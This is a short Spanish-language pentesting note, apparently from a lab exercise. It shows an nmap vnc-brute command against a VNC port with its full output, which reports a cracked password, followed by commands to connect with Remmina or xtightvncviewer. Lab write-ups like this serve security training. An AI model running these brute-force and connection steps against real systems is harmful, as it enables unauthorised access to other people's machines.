- Usar nmap para efectuar un ataque de fuerza bruta contra VNC
```bash
┌──(kali㉿kali)-[~]
└─$ nmap --script vnc-brute -p 5900 10.10.46.224 -v
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-05 09:18 EST
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 09:18
Completed NSE at 09:18, 0.00s elapsed
Initiating Ping Scan at 09:18
Scanning 10.10.46.224 [2 ports]
Completed Ping Scan at 09:18, 0.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:18
Completed Parallel DNS resolution of 1 host. at 09:18, 13.01s elapsed
Initiating Connect Scan at 09:18
Scanning 10.10.46.224 [1 port]
Discovered open port 5900/tcp on 10.10.46.224
Completed Connect Scan at 09:18, 0.26s elapsed (1 total ports)
NSE: Script scanning 10.10.46.224.
Initiating NSE at 09:18
NSE Timing: About 4.76% done; ETC: 09:54 (0:33:40 remaining)
Completed NSE at 09:20, 103.75s elapsed
Nmap scan report for 10.10.46.224
Host is up (0.26s latency).

PORT     STATE SERVICE
5900/tcp open  vnc
| vnc-brute: 
|   Accounts: 
|     1q2w3e4r - Valid credentials
|_  Statistics: Performed 951 guesses in 102 seconds, average tps: 8.6

NSE: Script Post-scanning.
Initiating NSE at 09:20
Completed NSE at 09:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 117.58 seconds                                                       
```

- Conectarse luego con un client VNC en Kali
		- Remmina
```
sudo apt install remmina
remmina -c vnc://10.10.46.224 
```
		- xtightvncviewer
```bash
xtightvncviewer 10.10.46.224 
```